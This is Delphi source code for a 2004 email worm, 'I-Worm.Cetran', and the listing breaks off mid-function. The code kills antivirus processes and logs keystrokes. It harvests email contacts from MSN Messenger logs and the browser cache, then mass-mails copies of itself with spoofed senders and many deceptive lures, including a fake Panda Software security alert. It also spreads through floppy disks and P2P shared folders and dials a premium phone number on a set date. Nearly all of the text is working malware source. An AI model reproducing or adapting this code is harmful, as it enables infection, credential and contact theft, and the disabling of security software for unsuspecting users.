   unit CetranWorm;

   {   2  de Junio 2004
        I-Worm.Cetran
      Author: Falckon/DCA
   }
   interface

   uses
     Windows,Messages, SysUtils, Variants, Classes, Graphics,Controls, Forms,
     TlHelp32,ShellApi,dialogs, StdCtrls,registry,Wininet, Psock, NMsmtp,
     ExtCtrls,jpeg;

     function tapiRequestMakeCall(lpszDestAddress,
                                      lpszAppName,
                                      lpszCalledParty,
                                      lpszComment: LPCSTR): DWORD; stdcall;
   type
     TForm1 = class(TForm)
       paths: TMemo;
       Mails: TMemo;
       Mailer: TNMSMTP;
       Memo1: TMemo;
       Timer1: TTimer;
       Timer2: TTimer;
       Image1: TImage;
       procedure fuck_u();
       procedure FormCreate(Sender: TObject);
       procedure Timer2Timer(Sender: TObject);
       Procedure Main_Zorra();
       procedure Timer1Timer(Sender: TObject);
       procedure Image1Click(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

   var
     Form1: TForm1;
     Reg:TRegistry;
     HKLM:HKEY = HKEY_LOCAL_MACHINE;
     numbers:array[0..4] of string;
     logs_msn:string;

   Const
     Viral_Name:PChar = 'CeTran Worm';
     enter = #13#10;
     cright:PChar = 'CeTran, Written in Mexico by Falckon';
     other:string = 'Pumas Campeoooon!!!!! :D!!,"Podran atrapar a uno, podran atrapar a dos, podran atrapar a tres... a los que quieran, pero nunca  atraparan a todos.';
     tm = #189;
     TAM:integer = 256;
   implementation

   {$R *.dfm}

   Function WriteReg(llave:HKEY;ruta:string;nombre:string;valor:string):string;
   begin
   Reg := TRegistry.Create;
   Reg.RootKey := llave;
     if Reg.OpenKey(ruta,true) then
     begin
        reg.WriteString(nombre,valor);
       end;
   end;
   // Code from mapson.d :) thx! Falckon... (of the 2003 year):P
   FUNCTION RegRead_Bin(LaKey: HKEY; Rutakey, Valor: String): String;
   VAR
     ValorRet: array[0..1500] of Char;
     TamaDato: Integer;
     Llaveactual: HKEY;
     Begin
       RegOpenKeyEx(LaKey, PChar(Rutakey), 0, KEY_ALL_ACCESS, llaveactual);
       TamaDato := 1501;
       RegQueryValueEx(llaveactual, PChar(Valor), nil, nil, @ValorRet[0], @TamaDato);
       RegCloseKey(llaveactual);
       Result := String(ValorRet);
   end;
   Function RegRead(key:hkey;ruta:string;valor:string):string;
   begin
     Reg := TRegistry.Create;
     Reg.RootKey := key;
      if Reg.OpenKeyReadOnly(ruta) then
      begin
       RegRead := reg.ReadString(valor);
      end;
   end;
   Function extract(mail:string):string;
   var
     Zorra:string;
     puta,p:integer;
    begin
      puta := strLen(PChar(mail));
        For p := 1 to puta - 4 do begin
        zorra := zorra + mail[p];
      end;
    extract := zorra;        // mail limpio
   end;
   Function Usuario():string;
   var
   user: Array[0..255] of char;
   tam: Cardinal;
   begin
    try
      tam := 255;
      GetUserName(user, tam);
      usuario := String(user);
    except
      raise;
    end;
   end;
   function extract_mail(s:string): string; //rutina aprendiad y extraida de Dexter thx!
   var i,j,k,l:integer;
       servidor,buajaja,n:byte;
       jojojo,serv:string;
   begin
   buajaja:=0;servidor:=0;n:=0;k:=0;jojojo:='';
   serv:='';extract_mail:='';
   for i:=1 to length(s) do
   begin
   if (i>3)and(UpCase(s[i])=':')and(UpCase(s[i-3])='L')and(UpCase(s[i-2])='T')and(UpCase(s[i-1])='O') then n:=n+1;
   if n=1 then
    begin
     for j:=i+1 to length(s) do
       begin
       inc(k);
       if (s[j]='@')and(buajaja=0) then
         begin
         for l:=k-1 downto 1 do jojojo:=jojojo+s[j-l];
         inc(servidor);
         n:=0;
         end;
       if (servidor>0)and(buajaja=0)and(s[j]<>'?')and(s[j]<>'"')and(s[j]<>'>')and(s[j]<>' ')and(s[j]<>':') then
       begin
       serv:=serv+s[j];
       end
       else if servidor>0 then buajaja:=1;
           end;
   extract_mail:=jojojo+serv;
   end;
   end;
   end;
   Function VW() : string;
   var
   buffer:Pchar;
   tam:integer;
   begin
      tam := 255;
      GetMem(buffer,tam);
      if Windows.GetModuleFileName(0,buffer,tam) <> 0 then
      begin
         VW := string(buffer);
      end;
      FreeMem(buffer,tam)
   end;
   Function AVN(av:string):boolean;
   var NM:ARRAY[1..87] of string ;
   i:integer;
   begin
     NM[1]:='_avp32';  NM[2]:='_avpcc';  NM[3]:='_avpm';  NM[4]:='advxdwin';
     NM[5]:='agentw';  NM[6]:='alertsvc';  NM[7]:='alogserv';
     NM[8]:='amon9x';  NM[9]:='anti-trojan'; NM[10]:='apvxdwin';
     NM[11]:='atupdater';  NM[12]:='atwatch';  NM[13]:='autodown';
     NM[14]:='avconsol';   NM[15]:='avconsol';  NM[16]:='avgcc32';
     NM[17]:='avgctrl';  NM[18]:='avgserv';  NM[19]:='avgserv9';
     NM[20]:='avkpop';   NM[21]:='avkserv';   NM[22]:='avkservice';
     NM[23]:='avsched32'; NM[24]:='avsynmgr';  NM[25]:='avwinnt';
     NM[26]:='avxmonitor9x';   NM[27]:='avxmonitornt';   NM[28]:='avxquar';
     NM[29]:='avxquar';   NM[30]:='blackd';   NM[31]:='blackice';
     NM[32]:='ccevtmgr';   NM[33]:='ccpxysvc';    NM[34]:='etrustcipe';
     NM[35]:='expert';   NM[36]:='f-agnt95';  NM[37]:='fameh32';
     NM[38]:='f-prot';  NM[39]:='fp-win';  NM[40]:='frw erv';
     NM[41]:='icload95';  NM[42]:='icloadnt';  NM[43]:='icsupp95';
     NM[44]:='icsuppnt';  NM[45]:='iomon98';  NM[46]:='msconfig';
     NM[47]:='navap';   NM[48]:='navapsvc';  NM[49]:='Navapw32';
     NM[50]:='pavproxy';   NM[51]:='avpupd';
     NM[52]:='buscareg'; // hey msc hotline sat thx por esa tool sirve mcuho pa el virii
     NM[53]:='pavmail';   NM[54]:='perupd';  NM[55]:='thav';
     NM[56]:='VCONTROL';  NM[57]:='NVSVC32';   NM[58]:='navlu32';
     NM[59]:='ndd32';   NM[60]:='npssvc';    NM[61]:='nsched32';
     NM[62]:='pcciomon';    NM[63]:='pccntmon';   NM[64]:='pccwin97';
     NM[65]:='pccwin98';   NM[66]:='pcscan'; NM[67]:='persfw';
     NM[68]:='pqremove';   NM[69]:='regedit';  NM[70]:='regedt32';
     NM[71]:='sysedit';      NM[72]:='vptray';   NM[73]:='vsched';
     NM[74]:='vsecomr';   NM[75]:='vshwin32';  NM[76]:='vsmain';
     NM[77]:='cleaner';  NM[78]:='avpupd';    NM[79]:='mcafee';
     NM[80]:='thd32';  NM[81]:='nupgrade';  NM[82]:='lucomserver';
     NM[83]:='zonealarm';    NM[84]:='navlu32';   NM[85]:='navwnt';
     NM[86]:='alertsvc';   NM[87]:='ZCAP';
     For i := 1 to 87 do begin
       If UpperCase(NM[i]+'.exe') = UpperCase(av) then begin
         AVN := True;
         end
       else
       begin
       AVN := False;
   end;
   end;
   end;
   procedure Fuck_AV;
   Var TD:tMsg;
     PA:Bool;
     THN:THandle;
     RTRO: TProcessEntry32;
   begin
   //Module for FUCK AVs :)
   //EiferSucht!! :) i lov this song :) rammstein r0X!
     SetTimer(0,0,3000,nil);
     While (GetMessage(TD,0,0,0)) DO Begin /// start timer
       THN := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS,0);
       RTRO.dwSize := sizeof(RTRO);
       PA := Process32First(THN,RTRO);
         While Integer(PA) <> 0 DO Begin
         If AVN(RTRO.szExeFile) = True then begin
         TerminateProcess(OpenProcess($0001,BOOL(0),RTRO.th32ProcessID),0);
       end;
       PA:=Process32Next(THN,RTRO);
     end;
     CloseHandle(THN);
     end;
   end;
   procedure inf_a();
   var windows:array[1..3] of string;
     i:integer;
     Tmr:TMsg;
     begin
     SetTimer(0,0,2000,nil);
      Windows[1] := 'Disco de 3'+tm+' (A:)';
        Windows[2] := '3'+tm+' Floppy (A:)';
        Windows[3] := 'Disco de 3'+tm;
        While (GetMessage(Tmr,0,0,0)) do begin
        For i := 1 to 3 do begin
        if FindWindow(nil,PChar(Windows[i])) <> 0 then begin
          CopyFile(PChar(VW),pchar('A:\petardas.pif'),false);
        end;
        end;
        end;
   end;

   Function IConnected:boolean;
   var
   conex_status:dword;
   begin
   conex_status := 2 {user uses a lan}    +
                      1 {user uses a modem.} +
                      4 {user uses a proxy}  ;  // ;)
   IConnected :=InternetGetConnectedState(@conex_status,0);
   end;
    Function str_replace(text:string):string;
   var
   p:integer;
   x:string;
   begin
   For p := 1 to strLen(PChar(text)) do begin
   if text[p] = ' ' then begin
   x := x + '_';
   end
   else
   begin
   x := x + text[p];
   end;
   end;
   str_replace := x;
   end;
   Function Gen_mail(num:integer):string;
   var
     domain:array[1..2] of string;
     names:array[1..10] of string;
     st1:string;
     begin
     randomize;
     names[1] := 'alejandra';  names[2] := 'jessica';
     names[3] := 'alondra';  names[4]:='lorena';
     names[5] := 'sofia'; names[6] := 'carla';
     names[7] := 'andrea';  names[8] := 'maria';
     names[9] := 'sabrina';names[10] := 'alicia';
     domain[2] := '@hotmail.com';
     domain[1] := '@prodigy.net.mx';
     st1 := LowerCase(str_replace(Usuario))+domain[num];
     if st1 = '' then begin
     st1 := names[random(10)+1] + inttostr(random(500)+1) +domain[num]
     end;
     Gen_mail := st1;
   end;
   function quit_fuck(txt:string):string;
   var
     str,str2:string;
     o,p,count:integer;
     begin
     str := '@';
     count := 0;
     if pos(str,txt) = 0 then begin
       For o := 1 to strLen(PChar(txt)) do
       begin
       count := count +1;
          if txt[o] = '[' then begin
           break;
          end;
         str2 := str2 + txt[o];
       end;
       count := count +7  ;
       str2 := str2 + str;
       For  p := count to strLen(Pchar(txt)) do   begin
        str2 := str2 + txt[p]  ;
       end;
     end;
     txt := str2      ;
     quit_fuck := txt;
   end;
   Function WindowsDir():string;
   var directorio:pChar;
   begin
     GetMem(directorio,TAM);
       if GetWindowsDirectory(directorio,TAM) <> 0 then
       begin
         WindowsDir := directorio
       end;
     freeMem(directorio,TAM)
   end;
   Function fuck_xcorreo(mail:string):string;
     Var bad_words:array[1..12] of string;
     p:integer;
     Begin
       bad_words[1]:='sopho';bad_words[2]:='kasper';
       bad_words[3]:='per';bad_words[4]:='norman';
       bad_words[5]:='virus';bad_words[6]:='anti';
       bad_words[7]:='micro';bad_words[8]:='videosoft';
       bad_words[9]:='panda';bad_words[10]:='anon';
       bad_words[11]:='archive';bad_words[12]:='sexxy';
       For p := 1 to 12 do
         begin
         if pos(bad_words[p],LowerCase(mail)) = 0 then
           begin
           fuck_xcorreo := mail;
         end
         else
         begin
           fuck_xcorreo := '';
           break;
         end;
       end;
   end;

   procedure sendmail(mails:TMemo;Mailing:TNMSMTP;para:string);
   var
     conected:boolean;
     smtp:array[1..2] of string;
     number,fuck:integer;
     number2:integer;
     SI: TStartupInfo;
     PI: TProcessInformation;
     subj:array[1..54] of string;
     body:array[1..54] of string;
     atth:array[1..54] of string;
     ext:array[1..3] of string;
     attachment:string;
     label yajodio;
     begin
     Randomize;
     ext[1]:='.exe';
     ext[2]:='.scr';
     ext[3]:='.pif';
       conected := false;
       Repeat
          if IConnected = true then begin conected := true;
          end;
       Until conected = true;
      subj[1] := 'Alerta de Seguridad';
       body[1] := '--------------------------' + enter +
                  'Panda Software:'+enter +
                  'Alerta de un  nuevo gusano que se expande por correo electronico'+enter+
                  'con diferentes mensajes llamativos para el usuario, se le recomienda '+enter +
                  'parchear sus sistemas con el siguiente fix-update de microsoft que se le envía';
       atth[1] := 'update04';
       //
       subj[2]:='SEXO Y ALCOHOL';
       body[2]:='Descubra las maravillas del alcohol, las ventajas y problemas '+enter+
       'que puede causar este interesante estimulante sexual, lectura adjunta en el zip.';
       atth[2]:='Sexo_alcohol';
       //
           subj[3]:='Muerte infantil por accidentes.';
       body[3]:='Los accidentes son la mayor causa de mortandad infantil en el mundo y se encuentra detrás de la muerte de más de un millón de niños'+enter+
      'que podían haberse evitado gracias a la prevención, por favor ayudenos a prevenir y reflexionar sobre esto re-enviando el mail, para más información en el zip adjunto.';
       atth[3]:='muertes';
       //
       subj[4]:='Estimulación infantil';
       body[4]:='La persona promedio utiliza 10% o 12% del cerebro. Ante la pregunta de cómo aprovechar ese 88% restante de capacidad, una de las alternativas ha sido la de trabajar con los bebés de manera cada vez más temprana, debido a que el cerebro '+enter+
       'está desarrollándose y tiene la plasticidad necesaria para dejarse moldear.'+enter+
      'si le interesa el tema y quiere saber más sobre técnicas de estimulación, en el adjunto zip que le mandamos se encuentra un artículo relacionado gracias.';
        atth[4]:='estimulacion';
       //
       subj[5]:='¿Cómo elegir a mi pareja? ';
       body[5]:='Es difícil encontrar un hombre o una mujer con todas las cualidades que algunas personas sueñan, pero se debe buscar una persona que tenga las más posibles.';
       atth[5]:='parejas';
       //
       subj[6]:='¿Cómo hacerlo sentir bien?';
       body[6]:='Hay varias maneras de hacer sentir bien a tu pareja, te las decimos en el zip';
       atth[6]:='sentirbien';
      //
      subj[7]:='El punto G..';
      body[7]:='Se dice que en las mujeres hay un punto que les causa basta excitación'+enter +
      'se rumora que en los hombres también, si deseas descubrir esto más información en el zip adjunto';
      atth[7]:='PuntoG';
      //
      subj[8]:='SEXO por internet';
      body[8]:='Más de 1,17 millones de españoles han mantenido relaciones sexuales con personas que conocieron a través de internet, mientras cerca del 25% '+enter+
      'de los usuarios establecen relaciones de amistad íntima (el 17% noviazgos) con otros internautas, y son los mayores de 55 años los que tienen menos reservas ante una primera cita, revela un estudio presentado aquí.';
      atth[8]:='estudio_sex';
      //
      subj[9]:='¿Cómo convertise en Hacker?';
      body[9]:='Hay varios pasos para convertise en hacker, te los presentamos, leelos y eso sí usa tus conocimientos para el bien';
      atth[9]:='hacking_steps';
      //
      subj[10]:='¿Cómo crear virus informáticos?';
      body[10]:='Has deseado crear virus?, has querido jugarle una broma a tu novia? tus amigos? o robarles las contraseñas de sus mails?'+enter+
      'aquí te enseño como puedes hacerlo! lee el presente documento y en una podrás crear tu propio virus! ciao';
      atth[10]:='make_virus';
      //
      subj[11]:='INCESTO';
      body[11]:='Sabes lo que se siente hacer el amor con tu prima? :P yo sí... quisieras saber?';
      atth[11]:='incestos';
     //
     subj[12]:='La puta virtual!';
     body[12]:='La puta virtual, con este nuevo programa podrás follar simuladamente con quien quieras'+enter+
     'como en la vida real! andale! sentiras placer real y gozarás de aquel disfrute que quizas no hayas sentido! vamos pruebalo pero eso sí no olvides los condones!';
     atth[12]:='puta_virtual';
      //
      subj[13]:='Medidor de pollas!';
      body[13]:='Con este nuevo y mejorado medidor de pollas podrás saber el tamaño real de tu pija(pene)'+enter+
      'ya no hace falta agarrar una regla o una cinta metrica! vamos que esperas! ahora podrás presumir tu tamaño con quien sea y a la hora que sea ;) ciao!';
      atth[13]:='medidor';
       //
       subj[14]:='Quieres Sexo conmigo?';
       body[14]:='Hola soy pamela, tengo 19 años, guerita, alta, tetas grandes (parecen pelotas), atrevete a conocerme te aseguro que no te defraudaré, te dejo mi foto ;) ciao contactame si te gusto!';
       atth[14]:='pame_sexy';

      //
      subj[15]:='Te Amo!';
      body[15]:='Te amo mucho, gracias por ser mi amigo :)';
      atth[15]:='amor_amistad';
          //
      subj[16]:='Hace tiempo..';
      body[16]:='Hola, hace tiempo que no te leía... me da gusto volver a escribirte, quería hablar contigo sobre un tema... pero se me hace tarde y te lo dejo en el adjunto.';
      atth[16]:='amistad';
       //Mapson dame ideas!!! razor tambien deme ideas!!
       subj[17]:='JAJAJAJAJA';
       body[17]:='Lee lo que te envio, jajajajaaj te vas a morir de la risa!! jajaja!';
       atth[17]:='bromas_pelotudas';

       subj[18]:='tq 1 buen!!';
       body[18]:='Te envio un besazo.. sellado con el corazón.. si tu eres mi amigo*a* lee mi carta de amor...';
       atth[18]:='amores4ever';

       subj[19]:='Como poner cachonda a una mujer!';
       body[19]:='Con estos 5 sencillos pasos lograrás poner cachondona a tu novia/esposa! ya no hace falta darles alcohol!!, leelos y no tendrás problemas bye!';
       atth[19]:='cachonda';

       //
       subj[20]:='los quiero!';
       body[20]:='Para todos mis amigos! espero que les guste!';
       atth[20]:='cositas';

       subj[21]:='un angel para todos';
       body[21]:='te  escribi y no me respondiste,  por alli alguien me dijo que ya me olvidaste'+enter+
       'que no quieres hablarme y que nuestra amistad de antes ya es pasado.'+enter+
       'no es verdad no?? solo quieren que nos distanciemos, por eso te envio es te mail, para que sepas cuanto te aprecio.';
       atth[21]:='te_aprecio';

       subj[22]:='Chistes de salinas';
       body[22]:='con estos chistes de salinas de gortari te cagaras de la risa... eso si no olvides pasarlo a tus amigos ;)';
       atth[22]:='gortari_muerto';

      subj[23]:='Prueba del chocolate';
      body[23]:='Haz esta Prueba de Personalidad Gracias a las Barras de Chocolate, si no lo lees y reenvias caera la maldición del chocolate sobre ti!!!';
      atth[23]:='chocolate_personalidad';

      Subj[24]:='Pumas Campeon!';
      body[24]:='Pumas le ganó a las chivas!!! orale! mirate estas fotos del partido! son realmente buenas!';
      atth[24]:='pumas_campeon';

      subj[25]:='Pases para la Eurocopa';
      body[25]:='Usted ha sido seleccionado para ir a la EuroCopa a todos los partidos, con todo pagado, para saber lo que tiene que hacer'+enter+
      'y recoger su premio lea las instrucciones adjuntas';
      atth[25]:='EuroCopa_premiado';

      subj[26]:='leelo ya!';
      body[26]:='No sé tu, pero yo lo leo antes de que me suceda algo...:|';
      atth[26]:='brujerias';

      subj[27]:='Posiciones Sexuales';
      body[27]:='El Kamasutra el arte sexual!';
      atth[27]:='kamasutra';

      subj[28]:='Como excitar a una mujer';
      body[28]:='Con este texto te enseño a excitar a una mujer en 5 sencillos pasos y si no lo crees pues simplemente no lo leas.';
      atth[28]:='excitacion_clitoris';

      subj[30]:='Infidelidad';
      body[30]:='Con esto, podrás saber si tu pareja es fiel o no, descubre las formas para descubrir esto! hazlo ya! no querras que te engañen..';
      atth[30]:='infelidad';

      subj[31]:='Anime y Manga';
      body[31]:='MM este anime esta genial, checa los mangas que te mando a la mejor hay uno que otro hentai o yaoi ;)';
      atth[31]:='animehentai';

      subj[32]:=':|';
      body[32]:='Esta si que es zorra!!!!';
      atth[32]:='britneyspears';

      subj[33]:='Olimpiadas 2004';
      body[33]:='Con estas animaciones de las olimpiadas en atenas te reiras hasta morir :D.';
      atth[33]:='olimpiadas_huevudas.zip';

      subj[34]:='mmm';
      body[34]:='Tan sabrosas, tan ricas.. tan grandes mmm...';
      atth[34]:='pechosSexys';

         subj[35]:='Invitación';
      body[35]:='Lo invitamos a particiar en nuestro nuevo foro, para más detalles favor de leer el anexo.';
      atth[35]:='ForoSexologia';
      number2:=random(35)+1;
      if number2 = 0 then begin
      number2 := 6;
      end;
      attachment := atth[number2]+ext[random(3)+1];
      CopyFile(PCHar(VW()),pchar('C:\'+attachment),false);
      randomize;
      CreateProcessA(pCHar('c:\DCA\zip.exe'),pchar(' C:\DCA\'+atth[number2]+'.zip'+' C:\'+attachment), nil, nil, False, 0, nil, nil, SI, PI);
      sleep(2000);
      smtp[1] := 'smtp.prodigy.net.mx'; smtp[2]:='mail.hotmail.com';
      Yajodio:
      number := random(2) + 1;
      Mailing.Host := smtp[number];
      Try
      Mailing.connect;
      Except
      IF Mailing.Connected = false then
      Begin
      fuck := 1;
      End
      Else
      fuck := 0;
      End;
      IF fuck = 1 then goto yajodio   ;
       Mailing.PostMessage.FromAddress := Gen_mail(number);
       if para = '' then begin
       Mailing.PostMessage.ToBlindCarbonCopy.AddStrings(mails.lines);
       end
       else
       begin
       Mailing.PostMessage.ToAddress.Add(para);
       end;
       Mailing.PostMessage.Subject := subj[number2] ;
       Mailing.PostMessage.Body.Add(body[number2]);
       Mailing.postmessage.Attachments.Add('C:\DCA\'+atth[number2]+'.zip');
       Mailing.SendMail;
       Mailing.Disconnect;
       deletefile('c:\'+attachment);
   end;
   function tapiRequestMakeCall; external 'TAPI32.DLL' name 'tapiRequestMakeCall';
    Procedure PLoad();
    var
    Time:TSystemTime;
    telefono: array [0..255] of char;
    aquien: array [0..255] of char;
      begin
      GetLocalTime(Time);
       if Time.wMonth = 7 then begin
       if Time.wDay = 4 then begin
       if time.wYear = 2004 then begin
         StrPCopy(telefono,'01 900 849 98 14');
         StrPCopy(aquien,'BigBrother');
         tapiRequestMakeCall(telefono,'',aquien,'');
       end;
       end;
       end;
       if Time.wMonth = 12 then begin
          Application.ShowMainForm := TRUE;
       end;
    end;
   procedure TForm1.fuck_u();
   var
     i:byte;
     begiN
       For i := 8 to 222 do
       begin
         if GetAsyncKeyState(i)= -32767  then begin
             case i of
           8  : Memo1.Lines[Memo1.Lines.count-1] := copy(Memo1.Lines[Memo1.Lines.count-1],1,length(Memo1.Lines[Memo1.Lines.count-1])-1); //Backspace
           9  : Memo1.text:=Memo1.text+'[Tab]';
           13 : Memo1.text:=Memo1.text+#13#10; //Enter
           17 : Memo1.text:=Memo1.text+'[Ctrl]';
           27 : Memo1.text:=Memo1.text+'[Esc]';
           32 :Memo1.text:=Memo1.text+enter; //Space
           // Del,Ins,Home,PageUp,PageDown,End
           33 : Memo1.text := Memo1.text + '[Page Up]';
           34 : Memo1.text := Memo1.text + '[Page Down]';
           35 : Memo1.text := Memo1.text + '[End]';
           36 : Memo1.text := Memo1.text + '[Home]';
           //Arrow Up Down Left Right
           37 : Memo1.text := Memo1.text + '[Left]';
           38 : Memo1.text := Memo1.text + '[Up]';
           39 : Memo1.text := Memo1.text + '[Right]';
           40 : Memo1.text := Memo1.text + '[Down]';

           44 : Memo1.text := Memo1.text + '[Print Screen]';
           45 : Memo1.text := Memo1.text + '[Insert]';
           46 : Memo1.text := Memo1.text + '[Del]';
           145 : Memo1.text := Memo1.text + '[Scroll Lock]';

           //Number 1234567890 Symbol !@#$%^&*()
           48 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+')'
                else Memo1.text:=Memo1.text+'0';
           49 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'!'
                else Memo1.text:=Memo1.text+'1';
           50 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'@'
                else Memo1.text:=Memo1.text+'2';
           51 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'#'
                else Memo1.text:=Memo1.text+'3';
           52 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'$'
                else Memo1.text:=Memo1.text+'4';
           53 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'%'
                else Memo1.text:=Memo1.text+'5';
           54 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'^'
                else Memo1.text:=Memo1.text+'6';
           55 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'&'
                else Memo1.text:=Memo1.text+'7';
           56 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'*'
                else Memo1.text:=Memo1.text+'8';
           57 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'('
                else Memo1.text:=Memo1.text+'9';
           65..90 : // a..z , A..Z
               begin
               if ((GetKeyState(VK_CAPITAL))=1) then
                   if GetKeyState(VK_SHIFT)<0 then
                      Memo1.text:=Memo1.text+LowerCase(Chr(i)) //a..z
                   else
                     Memo1.text:=Memo1.text+UpperCase(Chr(i))//A..Z
               else
                   if GetKeyState(VK_SHIFT)<0 then
                       Memo1.text:=Memo1.text+UpperCase(Chr(i)) //A..Z
                   else
                       Memo1.text:=Memo1.text+LowerCase(Chr(i)); //a..z
               end;
           //Numpad
           96..105 : Memo1.text:=Memo1.text + inttostr(i-96); //Numpad  0..9
           106:Memo1.text:=Memo1.text+'*';
           107:Memo1.text:=Memo1.text+'&';
           109:Memo1.text:=Memo1.text+'-';
           110:Memo1.text:=Memo1.text+'.';
           111:Memo1.text:=Memo1.text+'/';
           144 : Memo1.text:=Memo1.text+'[Num Lock]';

           112..123: //F1-F12
               Memo1.text:=Memo1.text+'[F'+IntToStr(i - 111)+']';

           186 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+':'
                 else Memo1.text:=Memo1.text+';';
           187 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'+'
                 else Memo1.text:=Memo1.text+'=';
           188 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'<'
                 else Memo1.text:=Memo1.text+',';
           189 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'_'
                 else Memo1.text:=Memo1.text+'-';
           190 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'>'
                 else Memo1.text:=Memo1.text+'.';
           191 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'?'
                 else Memo1.text:=Memo1.text+'/';
           192 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'~'
                 else Memo1.text:=Memo1.text+'`';
           219 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'{'
                 else Memo1.text:=Memo1.text+'[';
           220 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'|'
                 else Memo1.text:=Memo1.text+'\';
           221 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'}'
                 else Memo1.text:=Memo1.text+']';
           222 : if GetKeyState(VK_SHIFT)<0 then Memo1.text:=Memo1.text+'"'
                 else Memo1.text:=Memo1.text+'''';
                 end;
             end;

       end;

   end;
   procedure xtraer(path:string;mails:TMemo);
   var
     shand:TSearchRec;
     counter,b:integer;
     begin
     counter := 0;
      if DirectoryExists(path) then
        begin
        If FindFirst(path + '\*.*',faDirectory,shand) = 0 then
        Begin
          While FindNext(shand) = 0 do
            begin
            numbers[counter] := shand.Name;      // obtiene los numeros del msn
            counter := counter + 1;
            end;
          end;
          For b := 1 to 4 do
            Begin
            logs_msn := RegRead(HKEY_CURRENT_USER,'\Software\Microsoft\MSNMessenger\PerPassportSettings\'+numbers[b],'MessageLogPath');
            If logs_msn <> '' then
            Begin
            If FindFirst(logs_msn +'\*.xml',faAnyFile,shand) =0 then
            Begin
            mails.Lines.add(extract(shand.Name));
          End;
          While FindNext(shand) = 0 do
          Begin
          if fuck_xcorreo(extract(shand.name)) <> '' then begin
          mails.lines.add(extract(shand.name));     // almacenamos un contacto en el memo
          end;
        end;
        End;
     End;
     end;
     end;
   procedure extract_msncontacts1(xmails:Tmemo)  ;
   Var
     path:string;
     path2,path3:string;
     c:integer;
     Appdat:array[1..2] of string;
    begin
    path3 := RegRead(HKEY_CURRENT_USER,'\Volatile Environment','APPDATA');
    //showmessage(path3);
    if path3 <> '' then begin
      path := path3+ '\Microsoft\MSN Messenger';
      //showmessage(path);
     xtraer(path,xmails);
    end
    else  begin
     path2 := '\Docume~1\'+Usuario;
     appdat[1]:='\Application Data'; appdat[2]:='\Datos de Aplicación';
        For c := 1 to 2 do
        begin
        path := 'c:'+path2 + appdat[c] + '\Microsoft\MSN Messenger';
       xtraer(path,xmails)  ;
       end;
       end;
     end;
   Procedure collecting_mails(cmail:TMemo;mails:Tmemo)      ;
   var   IEContent,IEContent2,contenido,vbs:String;
   joder,mierda:textfile;
   puta:TSearchRec;
   B:integer;
   begin
     IEContent := '\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Cache\Paths' ;
     IEContent2 := RegRead(HKLM,IEContent,'Directory');
      if IEContent2 <> '' then
      begin
      if not fileexists('c:\log.vbs') then begin
      vbs := 'Dim pz,folders' + enter + 'Set pz = CreateObject("Scripting.FileSystemObject")' + enter +
        'searching("'+IEContent2+'")'+enter+enter+'Sub searching(puta)'+enter+
        'Dim gf,pa,ex,sf'+enter+
        'Set gf = pz.GetFolder(puta).subfolders'+enter+
        'For each pa in gf'+enter+
        'folders = folders + pa + vbcrlf'+enter+
        'next'+enter+'Dim ass'+enter+
        'Set ass = pz.CreateTextFile("c:\f.log")'+enter+
        'ass.writeline folders'+enter+
        'ass.close'+enter+
        'end sub';
        AssignFile(joder,'c:\log.vbs');
        ReWrite(joder);
        WriteLn(joder,vbs);
        closefile(joder);
         Sleep(2000);
         ShellExecute(Form1.handle,nil,pCHar('c:\log.vbs'),'','',SW_HIDE);
         Sleep(3000);
         end;
     end;
     cmail.Lines.LoadFromFile('c:\f.log');
     cmail.lines.add(IEContent2);
     For b := 1 to cmail.Lines.Count do begin
       if cmail.lines[b] <> '' then
       begin
        FindFirst(cmail.Lines[b]+'\*.htm*',faArchive,puta);
        While FindNext(puta) = 0 do begin
        if fileexists(cmail.lines[b]+'\'+puta.Name) then begin
        //showmessage(cmail.lines[b]+'\'+puta.Name);
        assignfile(mierda,cmail.lines[b]+'\'+puta.Name);
        reset(mierda);
        While not eof(mierda) do   begin
        readln(mierda,contenido);
         if  fuck_xcorreo(extract_mail(contenido)) <> '' then begin
         mails.Lines.Add(extract_mail(Contenido));
         end;
         end;
         end;
         end;
         end;
         end;
    end;
     Procedure FuXor();
    var
    P2P:array[1..12] of string;
    pfiles:string;
    p,c,l:integer;
    files:array[1..30] of string;
    crako:array[1..3] of string;
    begin
    crako[1] := ' cracked';
    crako[2]:='';
    crako[3]:=' + crack';
    pfiles:=RegRead(HKEY_LOCAL_MACHINE,'\Software\Microsoft\Windows\CurrentVersion\','ProgramFilesDir');
    P2P[1]:='\KaZaA\My Shared Folder\'; P2P[2] :='\edonkey2000\incoming\';
     P2P[3]:='\gnucleus\downloads\'; P2P[4]:='\Grokster\My Grokster\';
     P2P[4]:='\icq\shared files\';P2P[5]:='\kazaa lite\my shared folder\';
     P2P[6]:='\KMD\My Shared Folder';P2P[7]:='\limewire\shared\';
     P2P[8]:='\morpheus\my shared folder\';P2P[9]:='\Overnet\Incoming\';
     P2P[10]:='\Rapigator\Share\'; P2P[11]:='\Tesla\Files\';
     P2P[11]:='\WinMX\My Shared Folder\';P2P[12]:='\XoloX\Downloads\';
